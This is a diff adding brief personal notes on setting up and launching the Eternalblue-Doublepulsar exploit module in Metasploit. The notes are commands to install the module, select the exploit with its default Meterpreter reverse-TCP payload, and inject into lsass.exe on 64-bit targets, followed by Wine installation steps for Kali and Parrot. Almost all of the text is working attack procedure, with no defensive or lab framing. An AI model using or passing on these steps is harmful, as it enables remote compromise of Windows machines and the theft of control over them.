@@ -1,0 +1,17 @@
+Getting Eternalblue to work
+cp /root/Eternalblue-Doublepulsar-Metasploit/deps/ /usr/share/metasploit-framework/modules/exploits/windows/smb/ -r
+cp /root/Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/
+cd /root/.wine/drive_c/
+ use exploit/windows/smb/eternalblue_doublepulsar 
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+
+set PROCESSINJECT lsass.exe for x64bit machine
+show targets
+
+wine installation
+wine --help 1:34 minutes
+#for kali linux
+dpkg --add-architecture i386 &&apt-get update &&apt-get install wine32
+
+#for parrot os wine32 is explicitly inside wine package and does not exist independently
+
